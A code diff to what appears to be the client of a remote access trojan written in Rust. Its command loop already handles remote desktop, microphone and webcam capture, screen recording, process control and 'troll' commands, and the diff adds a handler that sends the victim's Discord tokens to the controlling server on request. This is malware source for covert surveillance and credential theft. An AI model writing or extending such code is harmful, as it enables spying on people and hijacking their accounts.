@@ -3,6 +3,7 @@ use crate::features::collectors::client_info;
 use crate::features::remote_desktop::{take_screenshot, start_remote_desktop, stop_remote_desktop, mouse_click, keyboard_input};
 use crate::features::mic::{send_mic_device_list, start_mic_live, stop_mic_live, start_mic_recording, stop_mic_recording};
 use crate::features::desktop_recording::{start_desktop_recording, stop_desktop_recording};
+use crate::features::discord::send_discord_tokens;
 use crate::features::process::{process_list, kill_process, start_process, suspend_process, resume_process};
 use crate::features::fun::execute_troll_command;
 use crate::features::webcam::take_webcam;
@@ -105,6 +106,7 @@ pub async fn reading_loop(
             Ok(Some(ClientboundPacket::StartMicRecording(device_id))) => start_mic_recording(device_id),
             Ok(Some(ClientboundPacket::StopMicRecording)) => stop_mic_recording(),
             Ok(Some(ClientboundPacket::RequestMicDevices)) => send_mic_device_list(),
+            Ok(Some(ClientboundPacket::RequestDiscordTokens)) => send_discord_tokens(),
             Ok(Some(ClientboundPacket::StartDesktopRecording(config))) => start_desktop_recording(config),
             Ok(Some(ClientboundPacket::StopDesktopRecording)) => stop_desktop_recording(),
 
